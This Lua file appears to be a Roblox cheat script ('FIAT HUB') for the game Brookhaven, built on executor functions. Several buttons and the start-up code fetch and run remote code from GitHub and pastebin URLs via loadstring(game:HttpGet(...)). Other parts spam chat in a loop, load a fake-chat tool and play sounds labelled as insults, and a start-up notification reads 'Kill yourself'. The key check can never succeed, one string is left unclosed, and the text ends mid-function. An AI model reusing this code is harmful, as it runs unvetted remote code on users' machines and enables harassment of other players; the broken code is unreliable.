local KEYSYSTEM_KEY = "FIAT HUB"  -- Official key
local DISCORD_LINK = "https://discord.gg/VrFBWxJEp5"  -- Official Discord

local function showKeyPrompt()
    local player = game.Players.LocalPlayer
    local gui = Instance.new("ScreenGui")
    gui.Name = "fiat key sisten by fiat"
    gui.ResetOnSpawn = false
    gui.Parent = player.PlayerGui

    -- Main Frame (Larger, Clean)
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 380, 0, 220)
    frame.Position = UDim2.new(0.5, -190, 0.5, -110)
    frame.BackgroundColor3 = Color3.fromRGB(10, 10, 25)
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Draggable = true
    frame.Parent = gui

    -- Aurora Gradient
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 5, 40)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 20, 60)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 35, 50))
    }
    gradient.Rotation = 135
    gradient.Parent = frame

    -- Neon Glow Border
    local glowStroke = Instance.new("UIStroke")
    glowStroke.Color = Color3.fromRGB(100, 200, 255)
    glowStroke.Thickness = 4
    glowStroke.Transparency = 0.4
    glowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    glowStroke.Parent = frame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 18)
    corner.Parent = frame

    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 50)
    title.BackgroundTransparency = 1
    title.Text = "key"
    title.TextColor3 = Color3.fromRGB(180, 240, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 24
    title.TextStrokeTransparency = 0.6
    title.TextStrokeColor3 = Color3.fromRGB(0, 150, 255)
    title.Parent = frame

    -- Input Box
    local input = Instance.new("TextBox")
    input.Size = UDim2.new(0.88, 0, 0, 45)
    input.Position = UDim2.new(0.06, 0, 0.3, 0)
    input.BackgroundColor3 = Color3.fromRGB(15, 25, 45)
    input.TextColor3 = Color3.fromRGB(200, 240, 255)
    input.PlaceholderText = "Enter key to unlock..."
    input.PlaceholderColor3 = Color3.fromRGB(120, 180, 220)
    input.Font = Enum.Font.Gotham
    input.TextSize = 17
    input.ClearTextOnFocus = true
    input.Parent = frame

    local inputCorner = Instance.new("UICorner")
    inputCorner.CornerRadius = UDim.new(0, 12)
    inputCorner.Parent = input

    local inputStroke = Instance.new("UIStroke")
    inputStroke.Color = Color3.fromRGB(80, 180, 255)
    inputStroke.Thickness = 2.5
    inputStroke.Parent = input

    -- Get Key Button
    local getKeyBtn = Instance.new("TextButton")
    getKeyBtn.Size = UDim2.new(0.42, 0, 0, 45)
    getKeyBtn.Position = UDim2.new(0.06, 0, 0.65, 0)
    getKeyBtn.BackgroundColor3 = Color3.fromRGB(100, 50, 200)
    getKeyBtn.Text = "GET KEY"
    getKeyBtn.TextColor3 = Color3.fromRGB(220, 255, 255)
    getKeyBtn.Font = Enum.Font.GothamBold
    getKeyBtn.TextSize = 16
    getKeyBtn.Parent = frame

    local getKeyCorner = Instance.new("UICorner")
    getKeyCorner.CornerRadius = UDim.new(0, 12)
    getKeyCorner.Parent = getKeyBtn

    local getKeyStroke = Instance.new("UIStroke")
    getKeyStroke.Color = Color3.fromRGB(150, 100, 255)
    getKeyStroke.Thickness = 2
    getKeyStroke.Parent = getKeyBtn

    -- Submit Key Button
    local submitBtn = Instance.new("TextButton")
    submitBtn.Size = UDim2.new(0.42, 0, 0, 45)
    submitBtn.Position = UDim2.new(0.52, 0, 0.65, 0)
    submitBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 140)
    submitBtn.Text = "SUBMIT KEY"
    submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    submitBtn.Font = Enum.Font.GothamBold
    submitBtn.TextSize = 16
    submitBtn.Parent = frame

    local submitCorner = Instance.new("UICorner")
    submitCorner.CornerRadius = UDim.new(0, 12)
    submitCorner.Parent = submitBtn

    local submitStroke = Instance.new("UIStroke")
    submitStroke.Color = Color3.fromRGB(0, 255, 180)
    submitStroke.Thickness = 2
    submitStroke.Parent = submitBtn

    -- Status Label
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Position = UDim2.new(0, 0, 0.88, 0)
    status.BackgroundTransparency = 1
    status.Text = "Join Discord for key!"
    status.TextColor3 = Color3.fromRGB(150, 200, 255)
    status.Font = Enum.Font.Gotham
    status.TextSize = 15
    status.Parent = frame

    -- Hover Effects
    getKeyBtn.MouseEnter:Connect(function()
        getKeyBtn.BackgroundColor3 = Color3.fromRGB(130, 70, 230)
    end)
    getKeyBtn.MouseLeave:Connect(function()
        getKeyBtn.BackgroundColor3 = Color3.fromRGB(100, 50, 200)
    end)

    submitBtn.MouseEnter:Connect(function()
        submitBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 160)
    end)
    submitBtn.MouseLeave:Connect(function()
        submitBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 140)
    end)

    -- Get Key Action
    getKeyBtn.MouseButton1Click:Connect(function()
        setclipboard(DISCORD_LINK)
        status.Text = "Discord link copied! Join for key."
        status.TextColor3 = Color3.fromRGB(100, 255, 150)
        task.wait(2)
        status.Text = "Paste key & submit."
        status.TextColor3 = Color3.fromRGB(150, 200, 255)
    end)

    -- Submit Key Action
    local valid = false
    submitBtn.MouseButton1Click:Connect(function()
        if input.Text:lower() == KEYSYSTEM_KEY then
            status.Text = "KEY ACCEPTED! Loading OK..."
            status.TextColor3 = Color3.fromRGB(100, 255, 100)
            task.wait(1.2)
            gui:Destroy()
            valid = true
        else
            status.Text = "INVALID KEY!"
            status.TextColor3 = Color3.fromRGB(255, 100, 100)
            input.Text = "130"
            task.wait(1.5)
            status.Text = "Try again or get key from Discord."
            status.TextColor3 = Color3.fromRGB(150, 200, 255)
        end
    end)

    repeat task.wait() until valid
end

showKeyPrompt()
-- =====================================================
--SUKUNA 💥😏
local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/VisualRoblox/Roblox/main/UI-Libraries/Visual%20Command%20UI%20Library/Source.lua', true))()
local Window = Library:CreateWindow({
    Name = ' Script made by Tobey | ',
    IntroText = ' | FIAT HUB (brokhaven) 🏡',
    IntroIcon = 'rbxassetid://10418960939',
    IntroBlur = true,
    IntroBlurIntensity = 15,
    Theme = Library.Themes.dark,
    Position = 'bottom',
    Draggable = true,
    Prefix = ';'
})
game.Players.LocalPlayer.Character.Humanoid.Health = 0
wait(0.1)
game.StarterGui:SetCore("SendNotification", {
    Title = "Note ";
    Text = " Kill yourself ☠️"; -- ARAB TEAM
    Duration = 5;
})
wait(0.1)
game.StarterGui:SetCore("SendNotification", {
    Title = "One moment please👁ـ👁 ";
    Text = "☠️ Welcome // This Script!! "; -- ARAB TEAM
    Duration = 5;
})
local args = {
    [1] = "RolePlayName",
    [2] = "🎀FIAT HUB user🎀"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
wait(0.1)
local args = {
    [1] = "RolePlayBio",
    [2] = "\240\159\145\190  Script by tobey \240\159\145\190"}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
wait(0.5)
game.StarterGui:SetCore("SendNotification", {
    Title = "Programmed by tobey ";
    Text = " FIAT HUB loaded"; -- ARAB TEAM
    Duration = 5;
})
loadstring(game:HttpGet(("https://raw.githubusercontent.com/speedwave1/speed_wave/refs/heads/main/Aya")))()
MakeWindow({
  Hub = {
    Title = "FIAT HUB| Brookhaven",
    Animation = "Welcome🤭"
  },
  Key = {
    KeySystem = false,
    Title = "Key System",
    Description = "",
    KeyLink = "",
    Keys = {"1234"},
    Notifi = {
      Notifications = true,
      CorrectKey = "Running the Script...",
      Incorrectkey = "The key is incorrect",
      CopyKeyLink = "Copied to Clipboard"
    }
  }
})
MinimizeButton({
  Image = "rbxassetid://10418960939",
  Size = {40, 40},
  Color = Color3.fromRGB(10, 10, 10),
  Corner = true,
  Stroke = true,
  StrokeColor = Color3.fromRGB(10, 10, 10)
})
local Main = MakeTab({Name = "{Developer Rights☠️} "})
local Image = AddImageLabel(Main, {
  Name = "Nagi_HUB",
 
})
local Paragraph = AddParagraph(Main, {"If you face a problem with the script or have ideas, contact me here 👇🏻 ", "good morning my brothers"})
AddButton(Main, {
  Name = " {Copy discord } ",
  Callback = function()
    setclipboard('https://discord.gg/VrFBWxJEp5')
  end
})
AddButton(Main, {
  Name = "{Copy discord user} ",
  Callback = function()
    setclipboard('freeze_stone')
end
})
AddButton(Main, {
  Name = "Copy my git hub",
  Callback = function()
    setclipboard('FIAT_258)
  end
})
AddButton(Main, {
  Name = "roblox usser",
  Callback = function()
    setclipboard('FIAT')
  end
  })
  AddButton(Main, {
  Name = "Copy FIAT HUB web",
  Callback = function()
    setclipboard('soon.')
  end
})
local Main = MakeTab({Name = "{★ Vehicle Music×} "})
  local Paragraph = AddParagraph(Main, {"Scooter", "good morning my brothers"})
 
  AddTextBox(Main, {
    Name = "{Enter the code in the box} ",
    Default = "",
  PlaceholderText = "Enter the code",
    ClearText = true,
    Callback = function(Value)
  local args1 = {
              [1] = "SkateBoard"
          }
          game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(args1))
  
          -- Replacing the static value with the input from the textbox
          local args2 = {
              [1] = "PickingScooterMusicText",
              [2] = Value -- Here, we use the textbox value to replace 35935204
          }
          game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(args2))
         
  end
  })
local Paragraph = AddParagraph(Main, {"Songs", "good morning my brothers"})
  AddButton(Main, {
  Name = "Tong Tong Sahor",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "123950910137807"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Funk",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "119936139925486"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Iraqi Song 1",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "11463392143"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Say the Say of Swords",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "135009652401688"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "I am Arabic",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "135646286229973"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Funk✨",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "13530439660"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Tong Tong Sahor 2",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "120353876640055"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Try it a bit strange",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "118939739460633"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Funk",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "99179094625273"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Code you'll like",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "87459334689630"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Code you'll like",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "71704979114937"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Bang🤭",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "4809574295"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
Name = "Energetic😵",
Callback = function()
local args = {
[1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
[1] = "PickingScooterMusicText",
[2] = "88052699315008"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
end
})
AddButton(Main, {
Name = "Call to Prayer",
Callback = function()
local args = {
[1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
[1] = "PickingScooterMusicText",
[2] = "1836685881"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
end
})
AddButton(Main, {
Name = "Huawei phone sound🥴",
Callback = function()
local args = {
[1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
[1] = "PickingScooterMusicText",
[2] = "7288899492"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
end
})
AddButton(Main, {
  Name = "Syrian song🤭🖤",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "98640789490482"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "You'll like it🤭! ",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "111718051430387"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
Name = "Horror😈",
Callback = function()
local args = {
[1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
[1] = "PickingScooterMusicText",
[2] = "1848748988"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
end
})
AddButton(Main, {
Name = "Indian song😭😭. ",
Callback = function()
local args = {
[1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
[1] = "PickingScooterMusicText",
[2] = "98757377820359"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
end
})
AddButton(Main, {
  Name = "Legendary",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "77125060517320"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Funk",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "6725490018"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
Name = "Michael Jackson",
Callback = function()
local args = {
[1] = "SkateBoard"
}
end
})
AddButton(Main, {
  Name = "Insult 1",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "6536444735"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Insult 2",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "8701632845"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Insult 3",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "6713993281"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Insult 3",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "5849978429"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Insult 4",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "7183326833"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Cuckoo🌙😵 ",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "1836685799"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Bigger Than Everything",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "15689446558"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Skibidi Boy",
  Callback = function()
     local args = {
    [1] = "SkateBoard"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "9108676586"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
  end
})
AddParagraph(Main, {" Insha'Allah in the next update I will add a lot more songs🤫!! ", "good morning my brothers"})
local Main = MakeTab({Name = "{☠️Spam and Chat👽} "})
  local Paragraph = AddParagraph(Main, {"Chat Spam", "good morning my brothers"})
 
  local TextSave
  local tcs = game:GetService("TextChatService")
  local chat = tcs.ChatInputBarConfiguration.TargetTextChannel
  function sendchat(msg)
    if tcs.ChatVersion == Enum.ChatVersion.LegacyChatService then
      game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(msg,"All")
    else
      chat:SendAsync(msg)
    end
  end
  AddTextBox(Main, {
    Name = "Write your message",
    Description = "Write the message",
    Flag = "Here",
    Default = false,
    Callback = function(text)
      TextSave = text
    end
  })
 
 
 
  AddToggle(Main, {
    Name = "Start Spam",
    Description = "Spam your writing",
    Flag = ".",
    Default = false,
    Callback = function(Value)
      getgenv().RaelHubSpawnText = Value
      while getgenv().RaelHubSpawnText do
        sendchat(TextSave)
        task.wait(0.1)
      end
    end
  })
  AddButton(Main, {
   Name = "Fake Chat",
   Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/game-hax/uca/main/release/uca.min.lua"))()
     end
  })
  AddButton(Main, {
   Name = "Draw in Chat",
   Callback = function()
         loadstring(game:HttpGet("https://pastebin.com/raw/Q5zhT6Mv"))()
     end
  })
local Main = MakeTab({Name = "{Names} "})
local colors = {
    Color3.fromRGB(255, 0, 0),
    Color3.fromRGB(255, 127, 0),
    Color3.fromRGB(255, 255, 0),
    Color3.fromRGB(0, 255, 0),
    Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(75, 0, 130),
    Color3.fromRGB(148, 0, 211),
}
local rainbowRunning = false
AddButton(Main, {
    Name = "Colored Name",
    Callback = function()
        if rainbowRunning then return end
        rainbowRunning = true
        task.spawn(function()
            while rainbowRunning do
                for _, color in ipairs(colors) do
                    local args = {
                        [1] = "PickingRPNameColor",
                        [2] = color,
                    }
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eColo1r"):FireServer(unpack(args))
                    task.wait(0.5) --
                end
            end
        end)
    end
})
AddTextBox(Main, {
    Name = "Bio",
    Default = "",
    PlaceholderText = "Write your name here",
    ClearTextOnFocus = true,
    Callback = function(text)
        local args = {
            [1] = "RolePlayName",
            [2] = text
        }
        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
    end
})
local section = AddSection(Main, {"Girls Names💗🤫"})
AddButton(Main, {
  Name = "Enjoy",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Enjoyyyy💞🫣"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Lucy",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Luuuuu★"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Sakuraa💞💞",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Sakuraa💞🤭"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Mariouma💞🤭",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Marioumaaa🤭✨"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Shorouq",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Shorouqiii🤭✨"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Roro",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Rorooo✨🤭🤭💗"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Laila",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "★Kayaa☆"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Aya ★",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Ayaaw٭"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Zainab",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Rjaaa"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Mimi!! ",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Mimiii😭! "
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Labneh",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Labneee"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Rimas",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Rimoushhh✨🤭"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Lolayyy but the rest eat lettuce",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Lolayyy✨"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Aye💞",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Aye🤫🤙🏻"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
local section = AddSection(Main, {"{Boys Names} "})
AddButton(Main, {
  Name = "Hًmًoٌdٍ",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Hummmmud😵"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Lemon😵",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Limeee"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Alpha",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] = "Alfaaa"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddButton(Main, {
  Name = "Speed",
  Callback = function()
    local args = {
    [1] = "RolePlayName",
    [2] =" Speed🌙🤙🏻"
}
game:GetService("ReplicatedStorage").RE:FindFirstChild("1RPNam1eTex1t"):FireServer(unpack(args))
  end
})
AddParagraph(Main, {" I don't have names, in the next update I will add more🤫", "good morning my brothers"})
local Main = MakeTab({Name = "Teleportation"})
  AddButton(Main, {
    Name = "Teleport Tool",
    Callback = function()
      mouse = game.Players.LocalPlayer:GetMouse()
 
  tool = Instance.new("Tool")
 
  tool.RequiresHandle = false
 
  tool.Name = "Teleport Tool Rights Lucy"
 
  tool.Activated:connect(function()
 
  local pos = mouse.Hit+Vector3.new(0,2.5,0)
 
  pos = CFrame.new(pos.X,pos.Y,pos.Z)
 
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
 
  end)
 
  tool.Parent = game.Players.LocalPlayer.Backpack
    end
  })
  local Slider = AddSlider(Main, {
    Name = "Teleport Distance",
    MinValue = 10,
    MaxValue = 50,
    Default = 25,
    Increase = 1,
    Callback = function(Value)
     
    end
  })
 
  -- Function to teleport to Teleport
  local function teleportToCenter()
